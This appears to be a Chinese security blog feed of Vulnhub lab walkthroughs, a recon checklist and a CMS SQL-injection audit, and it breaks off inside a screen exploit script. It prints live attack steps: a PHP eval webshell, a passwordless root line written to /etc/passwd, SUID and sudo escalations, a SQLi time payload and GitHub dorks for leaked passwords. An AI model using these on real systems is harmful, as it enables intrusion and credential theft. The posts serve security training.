<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221135800.png"><br>在root目录中找到第三个flag.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211221135849.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Linux提权</tag>
        <tag>wordpress</tag>
        <tag>SUID提权</tag>
        <tag>nmap提权</tag>
        <tag>Vlunhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CH4INRULZ_v1.0.1靶机</title>
    <url>/2021/12/22/CH4INRULZ-v1-0-1%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="CH4INRULZ-v1-0-1靶机"><a href="#CH4INRULZ-v1-0-1靶机" class="headerlink" title="CH4INRULZ_v1.0.1靶机"></a>CH4INRULZ_v1.0.1靶机</h1><h2 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h2><p><a href="https://www.vulnhub.com/entry/ch4inrulz-101,247/">下载地址</a><br>目标:获得root权限， 获得root中flg</p>
<span id="more"></span>

<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>nmap扫描结果<img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222083518.png" alt="扫描结果"><br>打开80端口发现是一个博客网页。<br>dirb 扫描结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222084251.png"><br>其中development需要登录<br>在使用<code>dirb http://10.1.1.135 -X .bak</code>扫描网站备份文件<br>得到结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222084707.png"><br>在备份文件中存在信息<br><code>&lt;!-- I will use frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0 as the .htpasswd file to protect the development path --&gt;</code><br>将<code>frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0</code>存储为1.txt使用<code>john 1.txt -show</code>完成信息解密。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222085805.png"><br>登录后显示<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222090020.png"></p>
<p>显示uploader开发完成。进入<code>/development/uploader/</code>是一个上传文件页面<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222172400.png"><br>尝试上传shell.php文件，采用白名单策略，显示只允许图片文件上传。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222172541.png"><br>上传图片马成功，但是没有显示图片地址，无法直接访问。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222172757.png"><br>访问8011端口只显示一个静态页面。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222172933.png"><br>使用dirb扫描后显示存在/api/index.html文件。访问后显示4个api接口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222173058.png"><br>进入<code>http://10.1.1.135:8011/api/files_api.php</code>接口显示需要输入file参数<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222173140.png"><br>尝试使用get方法传递参数,显示本机ip地址为非法ip。重新尝试使用POST方法传递参数。<br>尝试将读取之前的upload.php文件，获得图片马上传地址。但是php文件直接解析，无法获取具体文件内容。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222173619.png"><br><code>file=php://filter/read=convert.base64-encode/resource=../../www/development/uploader/upload.php</code><br>使用php伪协议通过base64编码后，可以获得upload.php程序源码。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222180334.png"><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222180406.png"><br>得到文件在<code>FRANKuploads/</code>下。通过之前的的文件读取直接执行php文件，进行反弹shell。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222175317.png"><br>获得www-data权限。<br>通过<code>ls -l</code>发现www在a文件夹中有完全权限。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211222175422.png"><br>通过nc传递脏牛文件，然后使用<code>gcc -pthread dirty.c -o diry -lcrypt</code>生成diry可执行文件。运行后产生root权限账户<code>firefart</code> 密码自己设置。通过ssh登录后获得root权限。同时在结束后如果使用命令<code>mv /tmp/passwd.bak /etc/passwd</code>可以恢复root账户。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>脏牛提权</tag>
        <tag>php伪协议</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2021/12/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="域名相关信息："><a href="#域名相关信息：" class="headerlink" title="域名相关信息："></a>域名相关信息：</h2><p>注册人， 注册资产 ， 邮箱</p>
<span id="more"></span>
<p><a href="http://whois.chinaz.com/">站长之家</a><br><a href="https://aiqicha.baidu.com/">爱企查</a><br>爱企查知识产权-&gt;网站备案<br>子域名， C段， 旁站<br><a href="http://z.zcjun.com/">子域名挖掘</a> ，layer子域名挖掘<br>nmap<br><code>nmap -sn 10.1.1.1/24</code>获得ip地址是否在线</p>
<p><code>namp -p- 10.1.1.1</code>全端口测试<br> fofa , goby , </p>
<h3 id="字典工具"><a href="#字典工具" class="headerlink" title="字典工具"></a>字典工具</h3><p> cupp<br> cewl</p>
<h2 id="目标服务器信息"><a href="#目标服务器信息" class="headerlink" title="目标服务器信息:"></a>目标服务器信息:</h2><h3 id="操作系统，版本，内核"><a href="#操作系统，版本，内核" class="headerlink" title="操作系统，版本，内核"></a>操作系统，版本，内核</h3><p><code>nmap -V -O</code><br>goby  </p>
<h3 id="中间件，端口服务，-CMS-目录遍历（网站图片）"><a href="#中间件，端口服务，-CMS-目录遍历（网站图片）" class="headerlink" title="中间件，端口服务， CMS, 目录遍历（网站图片）"></a>中间件，端口服务， CMS, 目录遍历（网站图片）</h3><p><a href="https://github.com/EdgeSecurityTeam/EHole">ehole</a></p>
<h3 id="目标后台，敏感文件目录"><a href="#目标后台，敏感文件目录" class="headerlink" title="目标后台，敏感文件目录"></a>目标后台，敏感文件目录</h3><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><p>jsFinder</p>
<h3 id="google黑语法"><a href="#google黑语法" class="headerlink" title="google黑语法"></a>google黑语法</h3><p>inurl:<br>intext:后台登录<br>intitle:网站管理<br>site:hnust.com<br>filetype:xlz 指定文件返回类型  </p>
<h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h3><p>ip=”1.1.1.1”<br>port=”3389”&amp;&amp;ip=”1.1.1.1”<br>domain=”qq.com”<br>city=”hangzhou”<br>country=””<br>app=”phpmyadmin”<br>server=””</p>
<h3 id="贴吧"><a href="#贴吧" class="headerlink" title="贴吧"></a>贴吧</h3><p>学号<br>身份证号</p>
<h3 id="弱爆破"><a href="#弱爆破" class="headerlink" title="弱爆破"></a>弱爆破</h3><p>1.弱口令用户名如admin,test,ceshi等<br>2.员工姓名全拼，员工姓名简拼<br>3.公司特征+员工工号/员工姓名<br>4.员工工号+姓名简拼<br>5.员工姓名全拼+员工工号<br>6.员工姓名全拼+重复次数，如zhangsan和zhangsan01<br>7.其他</p>
<h3 id="qq新生群"><a href="#qq新生群" class="headerlink" title="qq新生群"></a>qq新生群</h3><p>学号<br>身份证号</p>
<p>手册<br>名单<br>教师手册<br>VPN<br>学号<br>人才培养<br>奖学金<br>校园卡</p>
<h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>C段B段扫描<br>监控<br>门禁<br>管理系统</p>
<h2 id="APP脱壳"><a href="#APP脱壳" class="headerlink" title="APP脱壳"></a>APP脱壳</h2><h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in:descripton test 			#仓库描述搜索含有关键字</span><br><span class="line">in:readme test  			 #Readme文件搜素含有关键字</span><br><span class="line">stars:&gt;3000 test 			#stars数量大于3000的搜索关键字</span><br><span class="line">stars:1000..3000 test	 #stars数量大于1000小于3000的搜索关键字</span><br><span class="line">forks:&gt;1000 test 			#forks数量大于1000的搜索关键字</span><br><span class="line">forks:1000..3000 test 	#forks数量大于1000小于3000的搜索关键字</span><br><span class="line">size:&gt;=5000 test 				#指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 test #发布时间大于2019-02-12的搜索关键字</span><br><span class="line">created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字</span><br><span class="line">user:test 								#用户名搜素</span><br><span class="line">license:apache-2.0 test	 #明确仓库的 LICENSE 搜索关键字</span><br><span class="line">language:java test 				#在java语言的代码中搜索关键字</span><br><span class="line">user:test in:name test		 #组合搜索,用户</span><br></pre></td></tr></table></figure>

<h3 id="配合google搜集信息"><a href="#配合google搜集信息" class="headerlink" title="配合google搜集信息"></a>配合google搜集信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp</span><br><span class="line"></span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line"></span><br><span class="line">site:Github.com smtp @126.com</span><br><span class="line"></span><br><span class="line">site:Github.com smtp @163.com</span><br><span class="line"></span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line"></span><br><span class="line">site:Github.com smtp password</span><br><span class="line"></span><br><span class="line">site:Github.com String password smtp</span><br><span class="line">我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的</span><br><span class="line"></span><br><span class="line">site:Github.com smtp @baidu.com</span><br></pre></td></tr></table></figure>

<h3 id="github数据库信息收集"><a href="#github数据库信息收集" class="headerlink" title="github数据库信息收集"></a>github数据库信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com sa password</span><br><span class="line"></span><br><span class="line">site:Github.com root password</span><br><span class="line"></span><br><span class="line">site:Github.com User ID=’sa’;Password</span><br><span class="line"></span><br><span class="line">site:Github.com inurl:sql</span><br></pre></td></tr></table></figure>
<h3 id="github进行SVN信息收集"><a href="#github进行SVN信息收集" class="headerlink" title="github进行SVN信息收集"></a>github进行SVN信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com svn</span><br><span class="line"></span><br><span class="line">site:Github.com svn username</span><br><span class="line"></span><br><span class="line">site:Github.com svn password</span><br><span class="line"></span><br><span class="line">site:Github.com svn username password </span><br></pre></td></tr></table></figure>

<h3 id="使用Github进行综合信息收集"><a href="#使用Github进行综合信息收集" class="headerlink" title="使用Github进行综合信息收集"></a>使用Github进行综合信息收集</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:Github.com password</span><br><span class="line"></span><br><span class="line">site:Github.com ftp ftppassword</span><br><span class="line"></span><br><span class="line">site:Github.com 密码</span><br><span class="line"></span><br><span class="line">site:Github.com 内部</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-1靶机</title>
    <url>/2021/12/25/DC-1%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-1靶机"><a href="#DC-1靶机" class="headerlink" title="DC-1靶机"></a>DC-1靶机</h1><h2 id="信息简介"><a href="#信息简介" class="headerlink" title="信息简介"></a>信息简介</h2><p><a href="https://www.vulnhub.com/entry/dc-1,292/">下载地址</a><br>目标:获得root目录下的flag</p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap扫描结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091333.png"><br>80端口上是使用Drupal建立的博客<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091512.png"><br>直接跑msfconsole获得www-data权限的shell。<br>寻找具有suid的可执行程序。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225092049.png"><br>发现可以使用Find，进行提权。<code> find / -name flag1.txt -exec &quot;/bin/sh&quot; \</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225092952.png">  </p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Linux提权</tag>
        <tag>Find提权</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-2靶机</title>
    <url>/2021/12/27/DC-2%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-2靶机"><a href="#DC-2靶机" class="headerlink" title="DC-2靶机"></a>DC-2靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-2,311/">下载地址</a><br>目标:取得root下的flag</p>
<span id="more"></span>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap 扫描 开放 80 web 端口和 7744 ssh端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211227225338.png"><br>访问80端口后发现一个wordpress博客网站，同时在网站中发现一个flag。提示我们使用Cewl生成密码字典。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211227225407.png"><br>使用BP使用用户名爆破login页面获得 <code>admin tom jerry</code>三个用户名可以使用。<br>在使用BP通过cewl获得的用户名，获得tom和jerry的密码。<br><code>tom:parturient  jerry:adipiscing</code>。<br>登录博客后都不能修改网页模板获得shell。尝试通过7744 ssh登录。<br>尝试之后发现tom可以登录靶机。但是使用的是rbash大多数命令都无法使用。<br>当前目录下的tom/usr/bin有less , vi ,ls, scp ，4个命令。尝试突破rbash的限制。<br>通过一下命令绕过rbash.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh <span class="comment">#设置在shell 中 运行a 等同于运行/bin/sh</span></span><br><span class="line">a</span><br><span class="line">PATH=<span class="variable">$PATH</span>:/bin  <span class="comment">#设置环境变量，获得su语句 </span></span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211227231403.png"><br>git可以使用，接着通过git获得root权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
<p>获得root权限。</p>
<p>Tips:<br>/bin是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmo、su、tar等。<br>/sbin一般是指超级用户指令。主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、<br>/usr/bin　是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、等。<br>/usr/sbin   放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、等。</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
        <tag>Linux提权</tag>
        <tag>wordpress</tag>
        <tag>Git提权</tag>
        <tag>rbash绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-3靶机</title>
    <url>/2022/01/18/DC-3%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-3靶机"><a href="#DC-3靶机" class="headerlink" title="DC-3靶机"></a>DC-3靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-32,312/">下载地址</a><br>目标:获得root flag</p>
<span id="more"></span>

<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap扫描结果显示，只开放了80端口。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118195840.png"><br>访问80页面后发现是一个博客，对目录进行扫描发现后台登录页面，同时该博客使用Joomla系统。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118200326.png">  </p>
<p>使用joomscan扫描网页，可以发现网站版本为3.7.0<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118210554.png">  </p>
<p>使用searchsploit离线搜索Exploit-DB漏洞数据，可以发现存在两个结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118210751.png"><br>使用<code>searchsploit -p 42033</code>快速获得绝对路径<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118211023.png"><br>文件中含有关于Sql注入漏洞和Sqlmap的使用方法。通过sqlmap获得帐号admin , 和密码hash.<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118212702.png"><br>通过john得到 帐号:admin 密码:snoopy<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118213317.png"><br>使用管理员登录后，如图进入模板页面。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118214115.png"><br>选择一个模板后,新建或者修改一个php文件为shell文件。之后在<code>http://10.1.1.138/templates/beez3/abcde.php</code>访问该shell文件。<br>反弹shell后权限为www-data，查看linux系统版本可以使用脏牛提权。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118215731.png"><br>通过php大马后上传脏牛到靶机使用后提权获得root权限。查看root-flag文件。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220118215815.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>脏牛提权</tag>
        <tag>Vulhub</tag>
        <tag>joomla</tag>
        <tag>searchsploit</tag>
      </tags>
  </entry>
  <entry>
    <title>CscmsV4.2漏洞复现与审计</title>
    <url>/2022/01/20/CscmsV4-2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="CScmsV4-2"><a href="#CScmsV4-2" class="headerlink" title="CScmsV4.2"></a>CScmsV4.2</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="后台歌曲删除页面SQL注入漏洞"><a href="#后台歌曲删除页面SQL注入漏洞" class="headerlink" title="后台歌曲删除页面SQL注入漏洞"></a>后台歌曲删除页面SQL注入漏洞</h3><span id="more"></span>

<p>进入网站后台，在歌曲管理页面添加歌曲后，将歌曲删除。歌曲进入回收站，    在回收站页面点击删除，此处存在SQL注入。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120211233.png"><br>抓包后修改POST数据<code>id=4)and(sleep(3))--+</code><br>对应的代码在\plugin\dance\admin\Dance.php:del()中<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120211420.png"><br>进入cscms/app/core/CS_Input.php中get_post(‘id’)方法，同时没有传递$xss_clean 和 $sql_clean的参数为空<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120211650.png"><br>再进入$this-&gt;post(‘id’, null, null)<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120212112.png"><br>进入_fetch_from_array($_POST, ‘id’, null, null)方法<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120212503.png"><br>判断传递的XSS_clean是否为Bool，如果不为Bool值则Xss_clean为本地设置的默认值false。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120212958.png"><br>在最后进行过滤，如果xss_clean为false ，则同时sql注入的过滤不被经过。可以发现传递的xss_clean的值默认为false所以。最后得到的$ids没有被过滤    <code>$ids = id=4)and(sleep(3))--+</code>  </p>
<p>之后进入yid==3判断，直接拼接在sql语句中<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120213526.png"><br>进入cscms/system/database/DB_driver.php:query($sql)<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120213834.png"><br>在query()中经过前期的判读后，进入simple_query($sql)<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120213927.png"><br>再simple_query()判断连接的合法性之后，进入__execte($sql)   __</p>
<p>_<br>在cscms/system/database/drivers/mysqli/mysqli_driver.php:_excute($sql)中，对SQL语句进行_preq_query($sql)后直接进行mysqli::query()进行查询。 </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220120214352.png">  </p>
<p>_preq_query()函数在匹配到存在delete语句时起作用，对我们没有影响。最后得到的结果是对sql语句的直接查询，导致sql注入。<br>在最开始获得数据的 $this-&gt;input-&gt;get_post()没有传递xss_clean参数，导致使用默认的xss_clean=false参数，也同时不进行sql注入的过滤。<br>同时使用的$this-&gt;db-&gt;query()整个过程都没有sql语句进行二次过滤，或者使用预编译导致直接拼接sql语句进行查询导致注入。 </p>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>首先在index.php中经过前期的配置后，包含<code>cscms/config/sys/Cs_Cscms.php</code>文件<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121111532.png"><br>在Cs_CsCscms.php中首先判断网站是否已经安装，然后配置基本的全局信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121112546.png"><br>翻了一下没有发现，全局的默认GET 或者 POST 参数过滤。  </p>
<p>核心文件主要在/plugins文件中.就先从dance开始审计。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121120623.png"><br>一路翻下来，在ajax.php文件发现一个直接将$_SESSION拼接到sql查询语句中。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121120826.png"><br>在开始的复现时，我们翻过-&gt;db-&gt;query的逻辑，并没有对参数进行二次过滤，也就是说这个语句很可能存在sql注入。现在开始往前查找函数的调用点。</p>
<p>在mobile.js 和 pc.js都都分别有调用。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121121054.png"><br>在pc.js中又发现是通过album_fav函数进行调用，同时通过提示信息我们可以发现这可能是在专辑收藏处使用的。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121121209.png"><br>再次搜索album_fav有top.html和top-show.htm使用了该函数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121121509.png">  </p>
<p>通过这些信息，我们在专辑推荐榜中点击具体专辑信息，在下方的收藏次找到了该函数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121122022.png">  </p>
<p>admin/dance/::hy</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-4靶机</title>
    <url>/2022/01/20/DC-4%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-4靶机"><a href="#DC-4靶机" class="headerlink" title="DC-4靶机"></a>DC-4靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">下载地址</a><br>目标:获得唯一一个FLAG  </p>
<span id="more"></span>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描发现有22 和 80端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121093552.png">  </p>
<p>80端口直接是一个登录页面，没有有效信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121095349.png">  </p>
<p>上BurpSuite进行密码爆破，先尝试帐号为admin，得到密码为happy<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121095437.png"><br>登录后，发现存在三个选项。点击抓包后发现存在,命令执行漏洞。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121095920.png">  </p>
<p>查看home目录发现存在三个用户。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121102756.png">  </p>
<p>在jim的目录中发现了备份密码的文件夹。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121103106.png">  </p>
<p>保存后使用hydra对ssh进行爆破。获得可用的帐号密码。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121103156.png"><br>登录后查看mbox。发现是关于邮件的信息。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121103837.png"><br>进入/var/mail 查看邮件详情，发现了charles的密码.<br><code>帐号:charles 密码:^xHhA&amp;hvim0y</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121103935.png"><br>通过<code>sudo -l</code>发现可以使用teehee。teehee是一个往文件内写内容的程序。我们往passwd中写入一个不需要密码的root用户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo teehee -a /etc/passwd</span><br><span class="line">test::0:0::/bin/bash</span><br></pre></td></tr></table></figure>
<p>切换用户后获得root权限，获得flag。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220121105441.png"></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>Vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Xdebug配合Phpstorm使用</title>
    <url>/2022/01/20/Xdebug%E9%85%8D%E5%90%88Phpstorm%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Xdebug的配置"><a href="#Xdebug的配置" class="headerlink" title="Xdebug的配置"></a>Xdebug的配置</h1><h3 id="所有流量在phpstorm调试"><a href="#所有流量在phpstorm调试" class="headerlink" title="所有流量在phpstorm调试"></a>所有流量在phpstorm调试</h3><p>在php.ini中添加<code>xdebug.remote_autostart=1</code>可以使所有的流量不需要浏览器安装Xdebug插件，就在phpStorm中调试。这样就可以配合BurpSuite使用。</p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>phpstorm</tag>
        <tag>Xdebug</tag>
      </tags>
  </entry>
  <entry>
    <title>DC-5靶机</title>
    <url>/2022/01/22/DC-5%E9%9D%B6%E6%9C%BA/</url>
    <content><![CDATA[<h1 id="DC-5靶机"><a href="#DC-5靶机" class="headerlink" title="DC-5靶机"></a>DC-5靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a href="https://www.vulnhub.com/entry/dc-5,314/">下载地址</a><br>目标:获得root权限，并拿到flag<br>特点:<br>任意文件包含+ngix日志写入小马<br>screen提权</p>
<span id="more"></span>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描结果开发80端口和111RPC端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122151921.png">  </p>
<p>进入之后是一个静态网页，点击了一下没有发现有效的信息。同时目录扫描的结果也存在/footer.php 和/thankyou.php两个文件。<br>footer.php十一个版权脚标  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155347.png">  </p>
<p>thankyou.php如下  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155420.png">  </p>
<p>这里去网上，搜索发现thankyou.php的版权标志不同，因此怀疑该处存在文件包含?(<del>我是不知道大佬怎么看出来的</del>)。    </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155707.png">  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155724.png">  </p>
<p>接着用字典跑BurpSuite爆破参数得到file是传输的参数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155809.png">  </p>
<p>接着尝试进行文件读取，发现可以读取passwd文件。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155950.png">  </p>
<p>通过前面的扫描知道http服务是使用ngix搭建的。我们可以往ngix中的日志写入php小马，然后读取日志文件运行。<br>接着读取nginx配置信息。获得日志文件路径  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置信息路径 /etc/nginx/nginx.conf</span><br><span class="line">日志路径</span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122160303.png">  </p>
<p>现在往日志中写入一句话木马<br><code>file=&lt;?php eval($_POST[&#39;cmd2&#39;]); ?&gt;</code><br>使用蚁剑进行连接。  </p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122162829.png"></p>
<p>打开终端后使用nc连接到kali<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122163202.png">  </p>
<p>使用find查看是否存在可以提取的应用。没有常见的提取应用但是存在<code>screen-4.5.0</code></p>
<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171654.png">  </p>
<p>尝试搜索是否存在可以提权的可能，存在可以提权的漏洞<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171826.png">  </p>
<p>查看提权的文件，按照它的过程生成libhax.so 和 rootshell两个文件  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span 